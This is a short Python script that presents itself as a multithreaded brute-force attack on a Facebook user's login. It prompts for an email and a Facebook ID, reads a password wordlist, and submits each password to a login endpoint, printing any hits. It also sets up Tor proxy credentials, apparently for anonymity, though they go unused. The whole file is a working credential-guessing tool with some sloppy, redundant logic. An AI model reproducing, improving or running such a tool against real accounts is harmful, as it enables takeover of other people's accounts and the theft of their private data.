import requests
import threading
import time
from requests.auth import HTTPProxyAuth

# Global variables
tor_proxy_ip = "127.0.0.1"
tor_proxy_port = "9050"
tor_proxy_auth = HTTPProxyAuth('your_tor_proxy_username', 'your_tor_proxy_password')
local_api_url = "http://127.0.0.1:5000/your-api-endpoint"
attempts = 0
successful_attempts = 0

# Function to perform brute force attack without Tor proxy
def brute_force(username, fb_id, passwords, proxy=None):
    global attempts, successful_attempts

    for password in passwords:
        attempts += 1
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None

            # Example: Make a request to the local API without using a proxy
            result = requests.get(local_api_url, params={'username': username, 'password': password},
                                  proxies=proxies, timeout=10)

            # Process result as needed
            if result.status_code == 200:
                successful_attempts += 1
                print(f"Successful attempt - Username: {username}, Password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")

# Function to read passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

# Function to execute the main brute-force attack
def main():
    global attempts, successful_attempts
    username = input("Enter email address (as username): ")
    fb_id = input("Enter Facebook ID: ")
    password_file = input("Enter the password file name: ")

    # Read passwords from file
    passwords = read_passwords(password_file)

    # Multi-threading
    threads = []
    num_threads = 5  # Adjust the number of threads as needed

    for i in range(num_threads):
        t = threading.Thread(target=brute_force, args=(username, fb_id, passwords))
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    # Print statistics
    print(f"\nTotal attempts: {attempts}")
    print(f"Successful attempts: {successful_attempts}")

if __name__ == '__main__':
    main()
